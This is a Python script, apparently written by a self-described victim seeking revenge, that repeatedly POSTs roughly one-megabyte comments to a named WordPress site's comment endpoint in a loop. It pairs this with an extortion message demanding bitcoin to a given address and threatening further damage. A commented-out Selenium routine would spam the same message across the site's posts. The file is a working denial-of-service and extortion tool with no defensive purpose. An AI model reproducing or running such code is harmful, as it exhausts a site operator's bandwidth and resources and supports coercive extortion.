import requests
import random
def randomstring(length):
	asciirange=('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',  \
	'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', \
	'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', \
	'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', \
	'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', \
	'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')
	lenascii=len(asciirange)
	r=[str(asciirange[random.randrange(lenascii)]) for x in range(length) ]
	return ''.join(r)

def selenium_attack():
	# URL='https://oceancrack.com/author/oceancr/'
	# driver=make_selenium_driver(headless=False)
	# page=get_page_selenium(driver,URL)
	# newlinks=make_soup(page).select('.entry-title a[rel="bookmark"]')
	# print(newlinks)
	# for l in newlinks:
	# 	# print(dir(l))
	# 	print(l['href'])
	# 	newpage=get_page_selenium(driver,l['href'])
	# 	comment_element=driver.find_element_by_id('comment')
	# 	author_element=driver.find_element_by_id('author')
	# 	email_element=driver.find_element_by_id('email')
	# 	submit_element=driver.find_element_by_id('submit')
	# 	author_element.send_keys('Nikhil @binance')
	# 	email_element.send_keys('electron_hacker@protonmail.com')
	# 	comment_element.send_keys(pitch)
	# 	submit_element.click()

	# 	driver.delete_all_cookies()
		# print(req)
		# print(req.text)
for x in range(100):
	pitch=f'''send 0.007BTC to_ADDRESS 1DMLotJo697RFPWLSvEhbQ1LiwoZVzn46f which_you_hack_from_me_on_binance
	 then i_will_stop_attack_your_server. i felt very bad that you took my bitcoin! its revenge time, 
	 hope you noticed 3-5 TB of bandwidth cost on your AWS.	but you messed with wrong person , 
	 now im angry return my bitcoin or i will kill your server and your virus trojan file which you distribute 
	 as fake download on oceancrack, remember what you did on 2nd april, hijacked my binance account with your trojan software.
	 so repay my bitcoin back or i will cause 10 times damage. ;) {randomstring(1000000)}'''
	postdata={
		"comment": pitch,
		"author": "sdcskdjcnksdjn",
		"email": "electron_hacker@protonmail.com",
		"url": "",
		"submit": "Post+Comment",
		"comment_post_ID": "511",
		"comment_parent": "0",
		"ak_js": "74",
		"ak_hp_textarea": ""
	}
	req=requests.post('https://oceancrack.com/wp-comments-post.php',data=postdata)
	print(f'posted {x}MB')